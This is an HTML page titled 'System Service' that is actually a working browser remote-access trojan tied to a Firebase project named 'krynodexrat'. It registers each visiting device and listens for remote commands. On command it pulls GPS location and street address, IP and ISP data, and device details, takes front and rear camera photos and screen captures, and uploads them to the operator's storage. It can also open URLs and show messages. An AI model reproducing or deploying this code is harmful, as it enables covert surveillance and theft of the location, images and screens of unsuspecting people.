<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<title>System Service</title>

<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-storage-compat.js"></script>

<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;color:#0f0;display:flex;align-items:center;justify-content:center;min-height:100vh;font-family:'Courier New',monospace;flex-direction:column;gap:10px;text-align:center;padding:20px;user-select:none;-webkit-user-select:none}
.status-text{font-size:11px;color:#0f0;letter-spacing:1px}
.id-text{font-size:7px;color:#222;margin-top:6px}
.alert-overlay{position:fixed;inset:0;background:rgba(0,0,0,.96);z-index:99999;display:flex;align-items:center;justify-content:center;flex-direction:column;gap:16px;animation:fadeIn .25s}
@keyframes fadeIn{from{opacity:0}to{opacity:1}}
.alert-box{background:#0a0a0a;border:1px solid #ff3333;border-radius:16px;padding:36px 28px;text-align:center;max-width:88vw;box-shadow:0 0 80px rgba(255,0,0,.15)}
.alert-msg{color:#ff4444;font-size:16px;font-weight:600;font-family:'Segoe UI',system-ui,sans-serif;word-break:break-word;line-height:1.5}
.alert-close{background:transparent;color:#ff6666;border:1px solid #ff3333;padding:10px 28px;border-radius:10px;font-size:13px;font-weight:600;cursor:pointer;margin-top:14px;transition:.2s;font-family:'Segoe UI',system-ui,sans-serif;letter-spacing:.5px}
.alert-close:hover{background:#ff3333;color:#000}
</style>
</head>
<body>
<div class="status-text" id="statusMsg">● INITIALIZING</div>
<div class="id-text" id="idDisplay"></div>

<script>
// ═══════════════════════ ID ═══════════════════════
const STORAGE_KEY='__az_id';
let DEVICE_ID=localStorage.getItem(STORAGE_KEY);
if(!DEVICE_ID){DEVICE_ID='DVC_'+Math.random().toString(36).substr(2,9)+'_'+Date.now().toString(36);localStorage.setItem(STORAGE_KEY,DEVICE_ID)}
document.getElementById('idDisplay').textContent=DEVICE_ID;

// ═══════════════════════ FIREBASE ═══════════════════════
const FB={apiKey:"AIzaSyBvlhJRWV8PIH09bHKdUpQKv4x6mT9wCIE",authDomain:"krynodexrat.firebaseapp.com",databaseURL:"https://krynodexrat-default-rtdb.asia-southeast1.firebasedatabase.app",projectId:"krynodexrat",storageBucket:"krynodexrat.firebasestorage.app",messagingSenderId:"465327768431",appId:"1:465327768431:web:3e5871b9f80dcbcad1de9a"};
firebase.initializeApp(FB);
const db=firebase.database();
const st=firebase.storage();

// ═══════════════════════ HELPERS ═══════════════════════
async function up(blob,path){const r=st.ref(path+Date.now()+'.jpg');await r.put(blob);return await r.getDownloadURL()}
function ts(){return Date.now()}

// ═══════════════════════ REGISTER ═══════════════════════
db.ref('devices/'+DEVICE_ID).update({id:DEVICE_ID,model:(navigator.userAgent.split(';')[1]||navigator.userAgent).trim().substring(0,60),platform:navigator.platform,lang:navigator.language,scr:screen.width+'x'+screen.height,reg:ts(),seen:ts(),on:true})
.then(()=>document.getElementById('statusMsg').textContent='● ACTIVE')
.catch(()=>document.getElementById('statusMsg').textContent='● ERROR');

setInterval(()=>db.ref('devices/'+DEVICE_ID).update({seen:ts(),on:true}),12000);

// ═══════════════════════ GPS + ADDRESS ═══════════════════════
async function gpsFull(){return new Promise(r=>{if(!navigator.geolocation){r({err:"GPS not available"});return}navigator.geolocation.getCurrentPosition(async p=>{const lat=p.coords.latitude,lon=p.coords.longitude;try{const re=await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);const d=await re.json();r({lat,lon,acc:Math.round(p.coords.accuracy)+'m',addr:d.display_name,city:d.address?.city||d.address?.town||'',state:d.address?.state||'',country:d.address?.country||'',map:`https://maps.google.com/?q=${lat},${lon}`})}catch(e){r({lat,lon,acc:Math.round(p.coords.accuracy)+'m',map:`https://maps.google.com/?q=${lat},${lon}`})}},e=>r({err:e.message}),{enableHighAccuracy:true,timeout:10000})})}

// ═══════════════════════ IP GEOLOCATION ═══════════════════════
async function ipGeo(){try{const re=await fetch('https://ipapi.co/json/');const d=await re.json();return{ip:d.ip,city:d.city,region:d.region,country:d.country_name,isp:d.org,timezone:d.timezone,asn:d.asn,map:`https://maps.google.com/?q=${d.latitude},${d.longitude}`}}catch(e){return{err:"IP lookup failed"}}}

// ═══════════════════════ DEVICE INFO ═══════════════════════
async function devInfo(){let bat='N/A';try{const b=await navigator.getBattery();bat=Math.round(b.level*100)+'% '+(b.charging?'⚡':'🔋')}catch(e){}let ip='N/A';try{ip=(await(await fetch('https://api.ipify.org?format=json')).json()).ip}catch(e){}return{ua:navigator.userAgent.substring(0,120),os:navigator.platform,lang:navigator.language,res:screen.width+'x'+screen.height+' @'+devicePixelRatio+'x',ram:navigator.deviceMemory||'?',cpu:navigator.hardwareConcurrency||'?',bat,ip,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,on:navigator.onLine,ck:navigator.cookieEnabled}}

// ═══════════════════════ CAMERA ═══════════════════════
async function snap(mode){
  const v=document.createElement('video');
  v.style.cssText='position:fixed;top:0;left:0;width:100vw;height:100vh;object-fit:cover;z-index:99999;background:#000';
  document.body.appendChild(v);
  let s;
  try{
    s=await navigator.mediaDevices.getUserMedia({video:{facingMode:mode==='front'?'user':'environment',width:{ideal:1280},height:{ideal:720}}});
    v.srcObject=s;await v.play();await new Promise(r=>setTimeout(r,2500));
    const c=document.createElement('canvas');c.width=v.videoWidth;c.height=v.videoHeight;
    c.getContext('2d').drawImage(v,0,0);
    const blob=await new Promise(r=>c.toBlob(r,'image/jpeg',.92));
    s.getTracks().forEach(t=>t.stop());v.remove();
    return blob;
  }catch(e){if(s)s.getTracks().forEach(t=>t.stop());v.remove();return null}
}

async function camAll(){
  const front=await snap('front');
  const back=await snap('back');
  const res={status:'captured'};
  if(front){const u=await up(front,'photos/front_'+DEVICE_ID+'_');res.front=u}
  if(back){const u=await up(back,'photos/back_'+DEVICE_ID+'_');res.back=u}
  if(!front&&!back)res.err="Camera denied";
  return res;
}

// ═══════════════════════ SCREENSHOT ═══════════════════════
async function shot(){
  try{
    const stream=await navigator.mediaDevices.getDisplayMedia({video:true,audio:false});
    const track=stream.getVideoTracks()[0];
    const v=document.createElement('video');v.srcObject=stream;await v.play();
    await new Promise(r=>setTimeout(r,1000));
    const c=document.createElement('canvas');c.width=v.videoWidth;c.height=v.videoHeight;
    c.getContext('2d').drawImage(v,0,0);
    const blob=await new Promise(r=>c.toBlob(r,'image/jpeg',.85));
    track.stop();v.remove();
    const u=await up(blob,'screenshots/'+DEVICE_ID+'_');
    return {status:'screen_captured',url:u};
  }catch(e){return {err:"Screenshot denied: "+e.message}}
}

// ═══════════════════════ ALERT ═══════════════════════
function alertFull(msg){
  const ov=document.createElement('div');ov.className='alert-overlay';
  ov.innerHTML=`<div class="alert-box"><p class="alert-msg">${msg}</p><button class="alert-close" onclick="this.closest('.alert-overlay').remove()">CLOSE</button></div>`;
  document.body.appendChild(ov);
  return {status:'alerted',msg};
}

// ═══════════════════════ EXECUTE ═══════════════════════
async function exec(cmd){
  const r={type:cmd,status:'ok',time:ts()};
  switch(cmd){
    case 'GPS':r.data=await gpsFull();break;
    case 'IP':r.data=await ipGeo();break;
    case 'INFO':r.data=await devInfo();break;
    case 'CAM':r.data=await camAll();break;
    case 'SHOT':r.data=await shot();break;
    default:
      if(cmd.startsWith('URL:')){open(cmd.slice(4),'_blank');r.data={url:cmd.slice(4)}}
      else if(cmd.startsWith('MSG:')){r.data=alertFull(cmd.slice(4))}
      else r.data={err:'unknown'};
  }
  return r;
}

// ═══════════════════════ LISTEN ═══════════════════════
db.ref('cmds/'+DEVICE_ID).on('child_added',async sn=>{
  const c=sn.val();if(!c||c.st!=='pending')return;
  sn.ref.update({st:'running'});
  const result=await exec(c.cmd);
  db.ref('data').push(result);
  sn.ref.update({st:'done'});
  setTimeout(()=>sn.ref.remove(),3000);
});
</script>
</body>
</html>
